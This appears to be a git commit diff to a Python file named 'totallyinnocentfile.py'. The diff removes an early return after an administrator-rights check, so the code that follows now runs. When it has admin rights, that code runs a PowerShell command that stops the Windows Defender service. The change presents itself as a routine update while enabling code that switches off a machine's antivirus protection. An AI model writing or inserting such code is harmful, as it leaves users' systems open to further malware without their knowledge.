4677d6ce9fa0d19708d502c35eb41d446f824fe5
WotsitGamer <73761519+WotsitGamer@users.noreply.github.com>
2022-05-31 18:09:32 +0100

    Update totallyinnocentfile.py

--- totallyinnocentfile.py
+++ totallyinnocentfile.py
@@ -4,7 +4,6 @@ def go();
        is_admin = (os.getuid() == 0)
    except AttributeError:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-   return is_admin
   if is_admin:
     subprocess.call("powershell -c sc stop WinDefend", shell=True)
   else:
